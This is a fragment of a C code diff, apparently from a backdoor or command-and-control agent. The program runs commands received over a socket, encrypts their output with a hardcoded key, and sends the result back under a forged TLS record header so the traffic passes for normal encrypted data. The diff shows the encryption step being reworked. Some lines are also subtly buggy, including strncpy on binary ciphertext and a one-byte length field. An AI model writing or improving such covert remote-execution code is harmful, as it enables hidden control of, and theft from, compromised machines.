@@ -252,9 +252,6 @@ int main(int argc, char const* argv[]) {
         cmd[cmd_s] = '\0';
 
         char buf_res[5000] = {0};
-        buf_res[0] = 0x17;
-        buf_res[1] = 0x03;
-        buf_res[2] = 0x03;
         int buf_res_s;
         int pipes[2];
         pid_t pid;
@@ -274,7 +271,7 @@ int main(int argc, char const* argv[]) {
             exit(EXIT_FAILURE);
         } else {
             close(pipes[1]);
-            buf_res_s = read(pipes[0], buf_res + 5, sizeof(buf_res) - 5);
+            buf_res_s = read(pipes[0], buf_res, sizeof(buf_res));
             wait(NULL);
         }
  
@@ -283,20 +280,22 @@ int main(int argc, char const* argv[]) {
             strncpy(buf_res, "(No Return)\n", buf_res_s);
         }
 
-        buf_res[buf_res_s + 5] = 0x00;
-        ++buf_res_s;
-
-        buf_res[3] = 0x00;
-        buf_res[4] = buf_res_s;
-
-        send(sock, buf_res, buf_res_s + 5, 0);
-
         unsigned char key[17] = {0x79, 0xE1, 0x0A, 0x5D, 0x87, 0x7D, 0x9F, 0xF7, 0x5D, 0x12, 0x2E, 0x11, 0x65, 0xAC, 0xE3, 0x25, 0x00};
         unsigned char *ciphertext = malloc(buf_res_s);
-        encrypt(key, buf_res + 5, ciphertext);
+        encrypt(key, buf_res, ciphertext);
         for(int i = 0; i < buf_res_s; i++)
             printf("%02hhX ", ciphertext[i]);
         printf("\n");
+
+        unsigned char* fin_res = malloc(5+buf_res_s);
+        fin_res[0] = 0x17;
+        fin_res[1] = 0x03;
+        fin_res[2] = 0x03;
+        fin_res[3] = 0x00;
+        fin_res[4] = buf_res_s;
+        strncpy(fin_res + 5, ciphertext, buf_res_s);
+
+        send(sock, fin_res, 5 + buf_res_s, 0);
     }
 
     close(client_fd);
